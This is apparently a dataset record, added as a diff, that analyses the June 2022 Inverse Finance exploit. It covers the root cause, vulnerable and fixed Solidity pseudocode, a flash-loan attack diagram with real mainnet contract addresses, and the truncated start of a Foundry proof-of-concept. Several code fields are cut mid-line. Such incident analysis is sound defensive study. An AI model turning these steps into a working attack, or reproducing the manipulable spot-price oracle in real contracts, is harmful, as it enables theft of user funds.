@@ -1,0 +1,37 @@
+{
+ "id": "2022__2022-06-16_InverseFinance_CurveOracleManipulation",
+ "source_file": "2022/2022-06-16_InverseFinance_CurveOracleManipulation.md",
+ "title": "Inverse Finance — Curve/Yearn Oracle Manipulation DOLA Over-Borrowing Analysis",
+ "date": "2022-06-16",
+ "protocol": "Inverse Finance",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$1,200,000 attacker profit (protocol bad debt: ~$5,830,000 DOLA)",
+ "loss_usd": 1200000.0,
+ "root_cause": "The collateral pricing function `_getCollateralPrice()` directly used Curve's `get_virtual_price()`, allowing a temporarily inflated AMM internal value caused by a large swap to be recognized as collateral value, enabling excessive DOLA borrowing",
+ "attack_tx": "Block 14,972,418",
+ "vulnerable_contract": "anYvCrv3Crypto 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable Inverse Finance collateral value calculation (pseudocode)\ncontract InverseAnchor {\n    IYearnVault public yvCrv3Crypto; // Yearn yvCurve-3Crypto vault\n    ICurvePool  public curve3crypto;  // Curve 3crypto pool\n\n    function _getCollateralPrice() internal view returns (uint256) {\n        // Yearn vault's pricePerShare (value per Curve LP within the vault)\n        uint256 pricePerShare = yvCrv3Crypto.pricePerShare();\n\n        //",
+  "❌ Curve virtual_price is a spot price — manipulable via large swaps\n        uint256 lpVirtualPrice = curve3crypto.get_virtual_price();\n\n        // Vault token price = pricePerShare * LP virtual price\n        return pricePerShare * lpVirtualPrice / 1e18;\n        //",
+  "❌ lpVirtualPrice can be inflated via flash loan\n    }\n\n    function borrow(uint256 amount) external {\n        uint256 collateralValue = balanceOf(msg.sender) * _getCollateralPrice() / 1e18;\n        uint256 maxBorrow = collateralValue * LTV / 100;\n        require(amount <= maxBorrow, \"exceeds LTV\");\n\n        DOLA.transfer(msg.sender, amount); // over-borrowing allowed\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern: Use independent Chainlink-based price\ncontract InverseAnchorFixed {\n    AggregatorV3Interface public btcPriceFeed;  // Chainlink BTC/USD\n    AggregatorV3Interface public ethPriceFeed;  // Chainlink ETH/USD\n\n    function _getCollateralPrice() internal view returns (uint256) {\n        //",
+  "✅ Use Chainlink validated oracle — AMM manipulation not possible\n        (, int256 btcPrice,,,) = btcPriceFeed.latestRoundData();\n        (, int256 ethPrice,,,) = ethPriceFeed.latestRoundData();\n\n        // Calculate LP value using pool asset weights and verified prices\n        return _calculateLPValue(uint256(btcPrice), uint256(ethPrice));\n    }\n}"
+ ],
+ "steps": [
+  ".exchange_underlying(WBTC → USDT, 27 WBTC)",
+  "⚡ WBTC ratio in pool spikes → virtual_price rises",
+  "add_liquidity(USDT, ...) → receive Curve 3crypto LP",
+  ".deposit(lpAmount) → receive yvCrv3Crypto tokens",
+  "⚡ virtual_price inflated → collateral value larger than actual",
+  "[2f] Swap DOLA → USDT"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Aave Flash Loan: Borrow 27 WBTC\n    │       AaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9)\n    │       .flashLoan([WBTC], [27e8], ...)\n    │\n    ├─[2] [Inside executeOperation callback]\n    │       │\n    │       ├─ [2a] Deposit WBTC into Curve 3crypto pool\n    │       │       Curve(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46)\n    │       │       .exchange_underlying(WBTC → USDT, 27 WBTC)\n    │       │       ⚡ WBTC ratio in pool spikes → virtual_price rises\n    │       │\n    │       ├─ [2b] Obtain Curve LP tokens\n    │       │       add_liquidity(USDT, ...) → receive Curve 3crypto LP\n    │       │\n    │       ├─ [2c] Deposit LP into Yearn vault\n    │       │       YearnVault(0xE537B5cc158EB71037D4125BDD7538421981E6AA)\n    │       │       .deposit(lpAmoun",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IAaveLendingPool {\n    function flashLoan(\n        address receiverAddress,\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata modes,\n        address onBehalfOf,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ninterface ICurve3Crypto {\n    function exchange_underlying(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;\n    function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;\n    function get_virtual_price() external view returns (uint256);\n}\n\ninterface IYearnVault {\n    function deposit(uint256 amount) external returns (uint256);\n    function withdraw(uint256 maxShares) "
+ ]
+}
